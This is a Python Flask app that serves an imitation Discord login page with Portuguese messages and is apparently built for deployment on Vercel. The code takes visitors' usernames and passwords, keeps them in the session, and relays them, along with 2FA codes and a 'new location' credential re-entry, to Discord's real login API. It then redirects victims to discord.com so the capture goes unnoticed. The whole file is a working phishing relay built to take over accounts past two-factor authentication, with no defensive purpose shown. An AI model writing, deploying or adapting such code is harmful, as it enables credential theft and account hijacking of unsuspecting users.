from flask import Flask, request, render_template, redirect, session, jsonify
from flask_cors import CORS
import requests
import json
import time
import re
from urllib.parse import urlencode

app = Flask(__name__)
app.secret_key = 'discord_api_login_secret_key_2024'
CORS(app)

class DiscordAPILogin:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        })
        self.base_url = 'https://discord.com'
        self.api_url = 'https://discord.com/api/v9'
    
    def get_login_page(self):
        """Get the login page to extract necessary tokens and cookies"""
        try:
            response = self.session.get(f'{self.base_url}/login')
            if response.status_code == 200:
                # Extract any CSRF tokens or other necessary data from the page
                content = response.text
                
                # Look for common patterns in Discord's login page
                csrf_token = None
                if 'csrf_token' in content:
                    csrf_match = re.search(r'"csrf_token":"([^"]+)"', content)
                    if csrf_match:
                        csrf_token = csrf_match.group(1)
                
                # Extract build info or other necessary data
                build_number = None
                build_match = re.search(r'"buildNumber":"([^"]+)"', content)
                if build_match:
                    build_number = build_match.group(1)
                
                return {
                    'success': True,
                    'csrf_token': csrf_token,
                    'build_number': build_number,
                    'cookies': dict(response.cookies)
                }
            else:
                return {'success': False, 'error': f'Failed to load login page: {response.status_code}'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def attempt_login(self, email, password):
        """Attempt to login using Discord's API endpoints"""
        try:
            # First, get the login page to extract necessary tokens
            login_page_data = self.get_login_page()
            if not login_page_data['success']:
                return login_page_data
            
            # Prepare login payload
            login_payload = {
                'login': email,
                'password': password,
                'undelete': False,
                'captcha_key': None,
                'login_source': None,
                'gift_code_sku_id': None
            }
            
            # Add CSRF token if available
            if login_page_data.get('csrf_token'):
                login_payload['csrf_token'] = login_page_data['csrf_token']
            
            # Set appropriate headers for the login request
            headers = {
                'Content-Type': 'application/json',
                'Origin': 'https://discord.com',
                'Referer': 'https://discord.com/login',
                'X-Requested-With': 'XMLHttpRequest',
            }
            
            # Add build number to headers if available
            if login_page_data.get('build_number'):
                headers['X-Super-Properties'] = json.dumps({
                    'os': 'Windows',
                    'browser': 'Chrome',
                    'device': '',
                    'system_locale': 'en-US',
                    'browser_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'browser_version': '120.0.0.0',
                    'os_version': '10',
                    'referrer': '',
                    'referring_domain': '',
                    'referrer_current': '',
                    'referring_domain_current': '',
                    'release_channel': 'stable',
                    'client_build_number': login_page_data['build_number'],
                    'client_event_source': None
                })
            
            # Attempt login
            response = self.session.post(
                f'{self.api_url}/auth/login',
                json=login_payload,
                headers=headers
            )
            
            if response.status_code == 200:
                data = response.json()
                
                # Check if login was successful
                if 'token' in data:
                    return {
                        'success': True,
                        'token': data['token'],
                        'user_id': data.get('user_id'),
                        'message': 'Login successful'
                    }
                elif 'mfa' in data and data['mfa']:
                    # 2FA required
                    return {
                        'success': False,
                        'requires_2fa': True,
                        'mfa_ticket': data.get('ticket'),
                        'message': '2FA required'
                    }
                elif 'captcha_key' in data:
                    # Captcha required
                    return {
                        'success': False,
                        'requires_captcha': True,
                        'captcha_sitekey': data.get('captcha_sitekey'),
                        'message': 'Captcha verification required'
                    }
                else:
                    return {
                        'success': False,
                        'error': 'Unknown response format',
                        'response_data': data
                    }
            elif response.status_code == 400:
                data = response.json()
                if 'message' in data:
                    return {
                        'success': False,
                        'error': data['message']
                    }
                else:
                    return {
                        'success': False,
                        'error': 'Invalid credentials or bad request',
                        'response_data': data
                    }
            else:
                return {
                    'success': False,
                    'error': f'Login request failed with status {response.status_code}',
                    'response_text': response.text[:500]
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Login attempt failed: {str(e)}'
            }
    
    def verify_2fa(self, mfa_ticket, mfa_code):
        """Verify 2FA code"""
        try:
            payload = {
                'code': mfa_code,
                'ticket': mfa_ticket
            }
            
            headers = {
                'Content-Type': 'application/json',
                'Origin': 'https://discord.com',
                'Referer': 'https://discord.com/login',
            }
            
            response = self.session.post(
                f'{self.api_url}/auth/mfa/totp',
                json=payload,
                headers=headers
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'token' in data:
                    return {
                        'success': True,
                        'token': data['token'],
                        'user_id': data.get('user_id'),
                        'message': '2FA verification successful'
                    }
                else:
                    return {
                        'success': False,
                        'error': 'Invalid 2FA response format',
                        'response_data': data
                    }
            else:
                data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {}
                return {
                    'success': False,
                    'error': data.get('message', 'Invalid 2FA code'),
                    'status_code': response.status_code
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'2FA verification failed: {str(e)}'
            }

# Initialize Discord API client
discord_client = DiscordAPILogin()

@app.route('/')
def index():
    """Serve the main login page"""
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    """Handle login form submission"""
    username = request.form.get('username')
    password = request.form.get('password')
    
    if not username or not password:
        return render_template('login.html', error="Por favor, preencha todos os campos.")
    
    # Store credentials in session
    session['username'] = username
    session['password'] = password
    
    try:
        # Attempt login via Discord API
        result = discord_client.attempt_login(username, password)
        
        if result['success']:
            # Login successful - redirect to Discord
            return redirect("https://discord.com/channels/@me")
        elif result.get('requires_2fa'):
            # 2FA required
            session['mfa_ticket'] = result.get('mfa_ticket')
            return render_template('login.html', show_2fa=True, username=username)
        elif result.get('requires_captcha'):
            # Captcha required - this is a limitation of API approach
            return render_template('login.html', error="Verificação de captcha necessária. Tente novamente mais tarde.")
        else:
            # Login failed
            error_message = result.get('error', 'Erro desconhecido durante o login.')
            return render_template('login.html', error=error_message)
            
    except Exception as e:
        return render_template('login.html', error=f"Erro durante o login: {str(e)}")

@app.route('/verify_2fa', methods=['POST'])
def verify_2fa():
    """Handle 2FA verification"""
    mfa_code = request.form.get('mfa_code')
    
    if not mfa_code:
        return render_template('login.html', show_2fa=True, error="Por favor, insira o código de autenticação.", username=session.get('username'))
    
    mfa_ticket = session.get('mfa_ticket')
    if not mfa_ticket:
        return render_template('login.html', error="Sessão expirada. Tente fazer login novamente.")
    
    try:
        # Verify 2FA code
        result = discord_client.verify_2fa(mfa_ticket, mfa_code)
        
        if result['success']:
            # 2FA successful - redirect to Discord
            session.pop('mfa_ticket', None)
            return redirect("https://discord.com/channels/@me")
        else:
            # 2FA failed
            error_message = result.get('error', 'Código de autenticação inválido.')
            return render_template('login.html', show_2fa=True, error=error_message, username=session.get('username'))
            
    except Exception as e:
        return render_template('login.html', show_2fa=True, error=f"Erro durante a verificação 2FA: {str(e)}", username=session.get('username'))

@app.route('/verify_new_location', methods=['POST'])
def verify_new_location():
    """Handle new location verification - simplified for API approach"""
    email = request.form.get('email')
    password = request.form.get('password')
    
    if not email or not password:
        return render_template('login.html', show_new_location=True, error="Por favor, preencha todos os campos.", username=session.get('username'))
    
    # For API approach, new location verification is typically handled differently
    # This is a placeholder that attempts a new login with the provided credentials
    try:
        result = discord_client.attempt_login(email, password)
        
        if result['success']:
            return redirect("https://discord.com/channels/@me")
        else:
            error_message = result.get('error', 'Credenciais inválidas.')
            return render_template('login.html', show_new_location=True, error=error_message, username=session.get('username'))
            
    except Exception as e:
        return render_template('login.html', show_new_location=True, error=f"Erro durante a verificação: {str(e)}", username=session.get('username'))

# For Vercel deployment
if __name__ == '__main__':
    app.run(debug=False)
